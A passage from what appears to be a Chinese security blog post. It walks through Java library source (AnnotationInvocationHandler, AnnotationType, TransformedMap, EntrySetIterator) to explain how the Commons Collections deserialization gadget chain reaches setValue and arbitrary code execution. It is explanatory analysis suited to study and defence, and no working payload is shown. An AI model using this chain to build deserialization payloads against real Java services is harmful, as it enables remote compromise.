<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#008000;font-weight:bold">new</span> AnnotationType<span style="color:#666">(</span>annotationClass<span style="color:#666">)</span>
</code></pre></td></tr></table>
</div>
</div><p>注意：这里传入了一个type参数，类型为annotation的Class。该type参数在该类的代码：</p>
<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">    AnnotationInvocationHandler<span style="color:#666">(</span>Class<span style="color:#666">&lt;?</span> <span style="color:#008000;font-weight:bold">extends</span> Annotation<span style="color:#666">&gt;</span> type<span style="color:#666">,</span> Map<span style="color:#666">&lt;</span>String<span style="color:#666">,</span> Object<span style="color:#666">&gt;</span> memberValues<span style="color:#666">)</span> <span style="color:#666">{</span>
          <span style="color:#008000;font-weight:bold">this</span><span style="color:#666">.</span><span style="color:#7d9029">type</span> <span style="color:#666">=</span> type<span style="color:#666">;</span>
          <span style="color:#008000;font-weight:bold">this</span><span style="color:#666">.</span><span style="color:#7d9029">memberValues</span> <span style="color:#666">=</span> memberValues<span style="color:#666">;</span>
       <span style="color:#666">}</span>
</code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>3.调用AnnotationType.memberTypes()方法得到一个Map类。</p>
<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">    <span style="color:#008000;font-weight:bold">public</span> Map<span style="color:#666">&lt;</span>String<span style="color:#666">,</span> Class<span style="color:#666">&lt;?&gt;&gt;</span> memberTypes<span style="color:#666">()</span> <span style="color:#666">{</span>
        <span style="color:#008000;font-weight:bold">return</span> memberTypes<span style="color:#666">;</span>
    <span style="color:#666">}</span>
</code></pre></td></tr></table>
</div>
</div><p>而memberTypes由如下定义：</p>
</li>
<li>
<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#008000;font-weight:bold">private</span> <span style="color:#00f">AnnotationType</span><span style="color:#666">(</span><span style="color:#008000;font-weight:bold">final</span> Class<span style="color:#666">&lt;?</span> <span style="color:#008000;font-weight:bold">extends</span> Annotation<span style="color:#666">&gt;</span> annotationClass<span style="color:#666">)</span> <span style="color:#666">{</span>
        <span style="color:#008000;font-weight:bold">if</span> <span style="color:#666">(!</span>annotationClass<span style="color:#666">.</span><span style="color:#7d9029">isAnnotation</span><span style="color:#666">())</span>
            <span style="color:#008000;font-weight:bold">throw</span> <span style="color:#008000;font-weight:bold">new</span> IllegalArgumentException<span style="color:#666">(</span><span style="color:#ba2121">&#34;Not an annotation type&#34;</span><span style="color:#666">);</span>

        Method<span style="color:#666">[]</span> methods <span style="color:#666">=</span>
            AccessController<span style="color:#666">.</span><span style="color:#7d9029">doPrivileged</span><span style="color:#666">(</span><span style="color:#008000;font-weight:bold">new</span> PrivilegedAction<span style="color:#666">&lt;</span>Method<span style="color:#666">[]&gt;()</span> <span style="color:#666">{</span>
                <span style="color:#008000;font-weight:bold">public</span> Method<span style="color:#666">[]</span> <span style="color:#00f">run</span><span style="color:#666">()</span> <span style="color:#666">{</span>
                    <span style="color:#408080;font-style:italic">// Initialize memberTypes and defaultValues
</span><span style="color:#408080;font-style:italic"></span>                    <span style="color:#008000;font-weight:bold">return</span> annotationClass<span style="color:#666">.</span><span style="color:#7d9029">getDeclaredMethods</span><span style="color:#666">();</span>
                <span style="color:#666">}</span>
            <span style="color:#666">});</span>

        memberTypes <span style="color:#666">=</span> <span style="color:#008000;font-weight:bold">new</span> HashMap<span style="color:#666">&lt;</span>String<span style="color:#666">,</span>Class<span style="color:#666">&lt;?&gt;&gt;(</span>methods<span style="color:#666">.</span><span style="color:#7d9029">length</span><span style="color:#666">+</span>1<span style="color:#666">,</span> 1<span style="color:#666">.</span><span style="color:#7d9029">0f</span><span style="color:#666">);</span>
        memberDefaults <span style="color:#666">=</span> <span style="color:#008000;font-weight:bold">new</span> HashMap<span style="color:#666">&lt;</span>String<span style="color:#666">,</span> Object<span style="color:#666">&gt;(</span>0<span style="color:#666">);</span>
        members <span style="color:#666">=</span> <span style="color:#008000;font-weight:bold">new</span> HashMap<span style="color:#666">&lt;</span>String<span style="color:#666">,</span> Method<span style="color:#666">&gt;(</span>methods<span style="color:#666">.</span><span style="color:#7d9029">length</span><span style="color:#666">+</span>1<span style="color:#666">,</span> 1<span style="color:#666">.</span><span style="color:#7d9029">0f</span><span style="color:#666">);</span>

        <span style="color:#008000;font-weight:bold">for</span> <span style="color:#666">(</span>Method method <span style="color:#666">:</span>  methods<span style="color:#666">)</span> <span style="color:#666">{</span>
            <span style="color:#008000;font-weight:bold">if</span> <span style="color:#666">(</span>Modifier<span style="color:#666">.</span><span style="color:#7d9029">isPublic</span><span style="color:#666">(</span>method<span style="color:#666">.</span><span style="color:#7d9029">getModifiers</span><span style="color:#666">())</span> <span style="color:#666">&amp;&amp;</span>
                Modifier<span style="color:#666">.</span><span style="color:#7d9029">isAbstract</span><span style="color:#666">(</span>method<span style="color:#666">.</span><span style="color:#7d9029">getModifiers</span><span style="color:#666">())</span> <span style="color:#666">&amp;&amp;</span>
                <span style="color:#666">!</span>method<span style="color:#666">.</span><span style="color:#7d9029">isSynthetic</span><span style="color:#666">())</span> <span style="color:#666">{</span>
                <span style="color:#008000;font-weight:bold">if</span> <span style="color:#666">(</span>method<span style="color:#666">.</span><span style="color:#7d9029">getParameterTypes</span><span style="color:#666">().</span><span style="color:#7d9029">length</span> <span style="color:#666">!=</span> 0<span style="color:#666">)</span> <span style="color:#666">{</span>
                    <span style="color:#008000;font-weight:bold">throw</span> <span style="color:#008000;font-weight:bold">new</span> IllegalArgumentException<span style="color:#666">(</span>method <span style="color:#666">+</span> <span style="color:#ba2121">&#34; has params&#34;</span><span style="color:#666">);</span>
                <span style="color:#666">}</span>
                String name <span style="color:#666">=</span> method<span style="color:#666">.</span><span style="color:#7d9029">getName</span><span style="color:#666">();</span>
                Class<span style="color:#666">&lt;?&gt;</span> type <span style="color:#666">=</span> method<span style="color:#666">.</span><span style="color:#7d9029">getReturnType</span><span style="color:#666">();</span>
                memberTypes<span style="color:#666">.</span><span style="color:#7d9029">put</span><span style="color:#666">(</span>name<span style="color:#666">,</span> invocationHandlerReturnType<span style="color:#666">(</span>type<span style="color:#666">));</span>
                members<span style="color:#666">.</span><span style="color:#7d9029">put</span><span style="color:#666">(</span>name<span style="color:#666">,</span> method<span style="color:#666">);</span>

                Object defaultValue <span style="color:#666">=</span> method<span style="color:#666">.</span><span style="color:#7d9029">getDefaultValue</span><span style="color:#666">();</span>
                <span style="color:#008000;font-weight:bold">if</span> <span style="color:#666">(</span>defaultValue <span style="color:#666">!=</span> <span style="color:#008000;font-weight:bold">null</span><span style="color:#666">)</span> <span style="color:#666">{</span>
                    memberDefaults<span style="color:#666">.</span><span style="color:#7d9029">put</span><span style="color:#666">(</span>name<span style="color:#666">,</span> defaultValue<span style="color:#666">);</span>
                <span style="color:#666">}</span>
            <span style="color:#666">}</span>
        <span style="color:#666">}</span>
</code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>这里分析一下代码，判断是否为Annotation Class之后得到了所有方法并且取消保护（doPrivileged），然后将所有方法做了判断，符合条件的话放入memberTypes（方法名，该方法返回的类型）。</p>
<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#008000;font-weight:bold">public</span> <span style="color:#008000;font-weight:bold">static</span> Class<span style="color:#666">&lt;?&gt;</span> invocationHandlerReturnType<span style="color:#666">(</span>Class<span style="color:#666">&lt;?&gt;</span> type<span style="color:#666">)</span> <span style="color:#666">{</span>
        <span style="color:#408080;font-style:italic">// Translate primitives to wrappers
</span><span style="color:#408080;font-style:italic"></span>        <span style="color:#008000;font-weight:bold">if</span> <span style="color:#666">(</span>type <span style="color:#666">==</span> <span style="color:#b00040">byte</span><span style="color:#666">.</span><span style="color:#7d9029">class</span><span style="color:#666">)</span>
            <span style="color:#008000;font-weight:bold">return</span> Byte<span style="color:#666">.</span><span style="color:#7d9029">class</span><span style="color:#666">;</span>
        <span style="color:#008000;font-weight:bold">if</span> <span style="color:#666">(</span>type <span style="color:#666">==</span> <span style="color:#b00040">char</span><span style="color:#666">.</span><span style="color:#7d9029">class</span><span style="color:#666">)</span>
            <span style="color:#008000;font-weight:bold">return</span> Character<span style="color:#666">.</span><span style="color:#7d9029">class</span><span style="color:#666">;</span>
        <span style="color:#008000;font-weight:bold">if</span> <span style="color:#666">(</span>type <span style="color:#666">==</span> <span style="color:#b00040">double</span><span style="color:#666">.</span><span style="color:#7d9029">class</span><span style="color:#666">)</span>
            <span style="color:#008000;font-weight:bold">return</span> Double<span style="color:#666">.</span><span style="color:#7d9029">class</span><span style="color:#666">;</span>
        <span style="color:#008000;font-weight:bold">if</span> <span style="color:#666">(</span>type <span style="color:#666">==</span> <span style="color:#b00040">float</span><span style="color:#666">.</span><span style="color:#7d9029">class</span><span style="color:#666">)</span>
            <span style="color:#008000;font-weight:bold">return</span> Float<span style="color:#666">.</span><span style="color:#7d9029">class</span><span style="color:#666">;</span>
        <span style="color:#008000;font-weight:bold">if</span> <span style="color:#666">(</span>type <span style="color:#666">==</span> <span style="color:#b00040">int</span><span style="color:#666">.</span><span style="color:#7d9029">class</span><span style="color:#666">)</span>
            <span style="color:#008000;font-weight:bold">return</span> Integer<span style="color:#666">.</span><span style="color:#7d9029">class</span><span style="color:#666">;</span>
        <span style="color:#008000;font-weight:bold">if</span> <span style="color:#666">(</span>type <span style="color:#666">==</span> <span style="color:#b00040">long</span><span style="color:#666">.</span><span style="color:#7d9029">class</span><span style="color:#666">)</span>
            <span style="color:#008000;font-weight:bold">return</span> Long<span style="color:#666">.</span><span style="color:#7d9029">class</span><span style="color:#666">;</span>
        <span style="color:#008000;font-weight:bold">if</span> <span style="color:#666">(</span>type <span style="color:#666">==</span> <span style="color:#b00040">short</span><span style="color:#666">.</span><span style="color:#7d9029">class</span><span style="color:#666">)</span>
            <span style="color:#008000;font-weight:bold">return</span> Short<span style="color:#666">.</span><span style="color:#7d9029">class</span><span style="color:#666">;</span>
        <span style="color:#008000;font-weight:bold">if</span> <span style="color:#666">(</span>type <span style="color:#666">==</span> <span style="color:#b00040">boolean</span><span style="color:#666">.</span><span style="color:#7d9029">class</span><span style="color:#666">)</span>
            <span style="color:#008000;font-weight:bold">return</span> Boolean<span style="color:#666">.</span><span style="color:#7d9029">class</span><span style="color:#666">;</span>

        <span style="color:#408080;font-style:italic">// Otherwise, just return declared type
</span><span style="color:#408080;font-style:italic"></span>        <span style="color:#008000;font-weight:bold">return</span> type<span style="color:#666">;</span>
    <span style="color:#666">}</span>
</code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>再次回到343行代码就清楚memberTypes 的内容是什么了。当然这里只是顺手做了一下分析，我们主要还是要看memberValues.entrySet()，我<strong>们在352行看到对memberValue调用了setValue()方法</strong>。那么memberValue有没有可能是MapEntry对象呐，我们向上关注一下memberValues，它是一个Map对象，所以我们需要一个实现了entrySet()方法的作用是返回一系列MapEntry类对象的类：
在TransformedMap类的父类AbstractInputCheckedMapDecorator类中实现了entrySet()方法</p>
<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">    <span style="color:#008000;font-weight:bold">public</span> Set <span style="color:#00f">entrySet</span><span style="color:#666">()</span> <span style="color:#666">{</span>
        <span style="color:#008000;font-weight:bold">if</span> <span style="color:#666">(</span>isSetValueChecking<span style="color:#666">())</span> <span style="color:#666">{</span>
            <span style="color:#008000;font-weight:bold">return</span> <span style="color:#008000;font-weight:bold">new</span> EntrySet<span style="color:#666">(</span>map<span style="color:#666">.</span><span style="color:#7d9029">entrySet</span><span style="color:#666">(),</span> <span style="color:#008000;font-weight:bold">this</span><span style="color:#666">);</span>
        <span style="color:#666">}</span> <span style="color:#008000;font-weight:bold">else</span> <span style="color:#666">{</span>
            <span style="color:#008000;font-weight:bold">return</span> map<span style="color:#666">.</span><span style="color:#7d9029">entrySet</span><span style="color:#666">();</span>
        <span style="color:#666">}</span>
    <span style="color:#666">}</span>
</code></pre></td></tr></table>
</div>
</div><p>跟进一下isSetValueChecking()方法：</p>
<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">    <span style="color:#008000;font-weight:bold">protected</span> <span style="color:#b00040">boolean</span> <span style="color:#00f">isSetValueChecking</span><span style="color:#666">()</span> <span style="color:#666">{</span>
        <span style="color:#008000;font-weight:bold">return</span> <span style="color:#008000;font-weight:bold">true</span><span style="color:#666">;</span>
    <span style="color:#666">}</span>
</code></pre></td></tr></table>
</div>
</div><p>这里直接返回了true。也就是会返回一个EntrySet(map.entrySet(), this)实例，该类为AbstractInputCheckedMapDecorator的内部类。
跟进一下EntrySet：</p>
<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">       <span style="color:#008000;font-weight:bold">protected</span> <span style="color:#00f">EntrySet</span><span style="color:#666">(</span>Set set<span style="color:#666">,</span> AbstractInputCheckedMapDecorator parent<span style="color:#666">)</span> <span style="color:#666">{</span>
            <span style="color:#008000;font-weight:bold">super</span><span style="color:#666">(</span>set<span style="color:#666">);</span>
            <span style="color:#008000;font-weight:bold">this</span><span style="color:#666">.</span><span style="color:#7d9029">parent</span> <span style="color:#666">=</span> parent<span style="color:#666">;</span>
        <span style="color:#666">}</span>
</code></pre></td></tr></table>
</div>
</div><p>将该类的parent字段设置为本实例，比如我们如果对一个TransformedMap实例调用entrySet(),那么他会返回一个EntrySet类实例，该实例的parent字段为TransformedMap实例，然后collection为空的Map.Entry对象。</p>
</li>
<li>
<p>再继续往下走就到了循环了，我们知道使用for (:) 循环实际是通过迭代器实现的，而</p>
</li>
</ul>
<p>EntrySet 是实现了迭代器的：</p>
<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#008000;font-weight:bold">public</span> Iterator <span style="color:#00f">iterator</span><span style="color:#666">()</span> <span style="color:#666">{</span>
            <span style="color:#008000;font-weight:bold">return</span> <span style="color:#008000;font-weight:bold">new</span> EntrySetIterator<span style="color:#666">(</span>collection<span style="color:#666">.</span><span style="color:#7d9029">iterator</span><span style="color:#666">(),</span> parent<span style="color:#666">);</span>
        <span style="color:#666">}</span>
</code></pre></td></tr></table>
</div>
</div><p>跟进一下EntrySetIterator 类，它也是位于AbstractInputCheckedMapDecorator类的内部类，可以传入一个迭代器（这里传入的是Map.Entry 对象迭代器），以及parent字段值。</p>
<p>然后设置EntrySetIterator的parent字段值也是parent，iterator 字段为Map.Entry 对象迭代器。</p>
<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"> <span style="color:#008000;font-weight:bold">static</span> <span style="color:#008000;font-weight:bold">class</span> <span style="color:#00f;font-weight:bold">EntrySetIterator</span> <span style="color:#008000;font-weight:bold">extends</span> AbstractIteratorDecorator <span style="color:#666">{</span>
    
        <span style="color:#408080;font-style:italic">/** The parent map */</span>
        <span style="color:#008000;font-weight:bold">private</span> <span style="color:#008000;font-weight:bold">final</span> AbstractInputCheckedMapDecorator parent<span style="color:#666">;</span>
    
        <span style="color:#008000;font-weight:bold">protected</span> <span style="color:#00f">EntrySetIterator</span><span style="color:#666">(</span>Iterator iterator<span style="color:#666">,</span> AbstractInputCheckedMapDecorator parent<span style="color:#666">)</span> <span style="color:#666">{</span>
            <span style="color:#008000;font-weight:bold">super</span><span style="color:#666">(</span>iterator<span style="color:#666">);</span>
            <span style="color:#008000;font-weight:bold">this</span><span style="color:#666">.</span><span style="color:#7d9029">parent</span> <span style="color:#666">=</span> parent<span style="color:#666">;</span>
        <span style="color:#666">}</span>
    
        <span style="color:#008000;font-weight:bold">public</span> Object <span style="color:#00f">next</span><span style="color:#666">()</span> <span style="color:#666">{</span>
            Map<span style="color:#666">.</span><span style="color:#7d9029">Entry</span> entry <span style="color:#666">=</span> <span style="color:#666">(</span>Map<span style="color:#666">.</span><span style="color:#7d9029">Entry</span><span style="color:#666">)</span> iterator<span style="color:#666">.</span><span style="color:#7d9029">next</span><span style="color:#666">();</span>
            <span style="color:#008000;font-weight:bold">return</span> <span style="color:#008000;font-weight:bold">new</span> MapEntry<span style="color:#666">(</span>entry<span style="color:#666">,</span> parent<span style="color:#666">);</span>
        <span style="color:#666">}</span>
    <span style="color:#666">}</span>
</code></pre></td></tr></table>
</div>
</div><p>最后调用next() 方法，其返回的是一个MapEntry对象。</p>
<p>到这里就基本完成了，如果进入了循环并且满足条件就会对MapEntry对象调用setValue。</p>
<p>根据之前的结论来看就可以完成RCE了。</p>
<p>总结一下我们传入一个构造好的AnnotationInvocationHandler对象，目标对其进行反序列，便会造成任意代码执行。</p>
<p>然后我们构建的AnnotationInvocationHandler类的构造方法：</p>
<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
